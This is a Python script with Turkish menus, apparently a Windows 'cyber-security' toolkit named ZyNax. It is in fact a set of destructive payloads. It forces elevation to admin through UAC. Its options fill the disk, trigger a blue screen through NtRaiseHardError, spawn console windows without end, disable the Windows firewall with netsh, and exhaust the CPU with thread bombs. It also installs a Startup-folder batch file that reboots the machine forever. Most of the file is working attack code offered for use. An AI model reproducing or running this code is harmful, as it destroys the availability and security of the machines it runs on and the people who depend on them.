import os
import sys
import time
import ctypes
import threading
import json
import platform
import subprocess
from urllib.request import urlopen

# --- RENK PALETİ ---
R, G, Y, B, C, W, RES = "\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[96m", "\033[97m", "\033[0m"
os.system("") 

def temizle():
    os.system('cls' if os.name == 'nt' else 'clear')

# --- ÖLÜMSÜZ YÖNETİCİ BAŞLATICI ---
def admin_zorla():
    if ctypes.windll.shell32.IsUserAnAdmin():
        return True
    else:
        try:
            # Burası 'Evet' dediğinde kodun yeni bir pencerede kalmasını sağlar
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{sys.argv[0]}"', None, 1)
            time.sleep(0.2) # Windows'un işlemi yakalaması için kısa bir ara
            os._exit(0) # Eski pencereyi tamamen kapat
        except:
            return False

def giris_ekrani():
    temizle()
    print(f"{R} [!] ZYNAX SİSTEM ÇEKİRDEĞİNE BAĞLANDI!{RES}")
    time.sleep(0.5)
    print(f"\n\t\t{R}╔══════════════════════════════════════════════╗")
    print(f"\t\t║          !!! ZYNAX SİBER GÜVENLİK !!!        ║")
    print(f"\t\t║               YAPIMCI: YUSUF                 ║")
    print(f"\t\t╚══════════════════════════════════════════════╝{RES}")
    print(f"\n\t\t{G}✅ YETKİ ONAYLANDI - SİSTEM HAZIR.{RES}")
    time.sleep(1)

def ana_menu():
    temizle()
    # GENİŞ VE KIRMIZI LOGO
    print(f"""{R}
 ███████╗██╗   ██╗███╗   ██╗ █████╗ ██╗  ██╗
 ╚══███╔╝╚██╗ ██╔╝████╗  ██║██╔══██╗╚██╗██╔╝
   ███╔╝  ╚████╔╝ ██╔██╗ ██║███████║ ╚███╔╝ 
  ███╔╝    ╚██╔╝  ██║╚██╗██║██╔══██║ ██╔██╗ 
 ███████╗   ██║   ██║ ╚████║██║  ██║██╔╝ ██╗
 ╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ v190
    {RES}""")
    print(f"\t{R}[!]{G} ZyNax{Y} v190{B} |{C} Yapımcı: {W}Yusuf{RES}")
    print(f"{C}—"*72 + f"{RES}")
    print(f" [01] {Y}🔍 SİSTEM ANALİZİ (FULL){RES}        [07] {R}🖼️  PENCERE BOMBASI (FORCE){RES}")
    print(f" [02] {Y}💣 DİSK BOMBACISI (ÖZEL){RES}        [08] {R}🛡️  FIREWALL BYPASS (HEPSİ){RES}")
    print(f" [03] {R}💻 MAVİ EKRAN (BSOD){RES}            [09] {R}🔒 SİSTEMİ DONDUR (CPU LOCK){RES}")
    print(f" [04] {R}⚠️  HARD RESET (FORMAT){RES}        [10] {R}🔄 SONSUZ BOOT DÖNGÜSÜ{RES}")
    print(f" [05] {B}⚡ SİSTEMİ YENİDEN BAŞLAT{RES}      [11] {C}🚪 GÜVENLİ ÇIKIŞ{RES}")
    print(f" [06] {C}⚙️  BIOS/UEFI ZORLA{RES}            {W}-------------------------{RES}")
    print(f"{C}—"*72 + f"{RES}")

    secim = input(f"\n {B}ZyNax_YUSUF > {RES}")

    if secim == "1":
        try:
            d = json.loads(urlopen("http://ip-api.com/json/").read().decode())
            print(f"\n{G}[+] IP: {d.get('query')}\n[+] Şehir: {d.get('city')}\n[+] CPU: {platform.processor()}{RES}")
        except: print(f"{R}Hata!{RES}")
        input("\nENTER..."); ana_menu()

    elif secim == "2":
        temizle()
        print(f"{R}—"*65 + f"\n\t[!!!] 💣 DİSK BOMBARDIMANI (ÖZEL) 💣 [!!!]\n" + "—"*65 + f"{RES}")
        try:
            yol_input = input(f"\n{C}[?] Yol ('m' = Masaüstü): {RES}").strip()
            yol = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'zynax_payload.dat') if yol_input.lower() == 'm' else yol_input
            birim = input(f"{Y}[?] Birim (mb / gb): {RES}").lower()
            miktar = int(input(f"{Y}[?] Miktar: {RES}"))
            boyut = miktar * 1024 * 1024 if birim == "mb" else miktar * 1024 * 1024 * 1024
            with open(yol, "wb") as f:
                f.seek(boyut - 1)
                f.write(b"\0")
            print(f"{G}[+] Başarılı!{RES}")
        except Exception as e: print(f"{R}Hata: {e}{RES}")
        input("\nENTER..."); ana_menu()

    elif secim == "3":
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))

    elif secim == "5":
        subprocess.run("shutdown /r /t 0 /f", shell=True)

    elif secim == "6":
        subprocess.run("shutdown /r /fw /t 0", shell=True)

    elif secim == "7":
        print(f"{R}PENCERE BOMBASI PATLIYOR...{RES}")
        while True:
            subprocess.Popen(["cmd.exe", "/c", "color 4 && title ZYNAX_BOMB"], creationflags=subprocess.CREATE_NEW_CONSOLE)

    elif secim == "8":
        subprocess.run("netsh advfirewall set allprofiles state off", shell=True)
        subprocess.run("netsh firewall set opmode mode=disable", shell=True)
        print(f"{G}[+] Firewall bypass edildi.{RES}"); time.sleep(2); ana_menu()

    elif secim == "9":
        print(f"{R}[!] CPU Lock Aktif...{RES}")
        def kilit():
            while True:
                threading.Thread(target=lambda: [os.urandom(10**7) for _ in range(2000)]).start()
        for _ in range(500):
            threading.Thread(target=kilit, daemon=True).start()
        time.sleep(5); ana_menu()

    elif secim == "10":
        try:
            yol = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'zynax_reboot.bat')
            with open(yol, "w") as f: f.write("@echo off\nshutdown /r /t 0 /f")
            subprocess.run("shutdown /r /t 0 /f", shell=True)
        except: subprocess.run("shutdown /r /t 0 /f", shell=True)

    elif secim == "11": sys.exit()
    else: ana_menu()

if __name__ == "__main__":
    if admin_zorla():
        giris_ekrani()
        ana_menu()
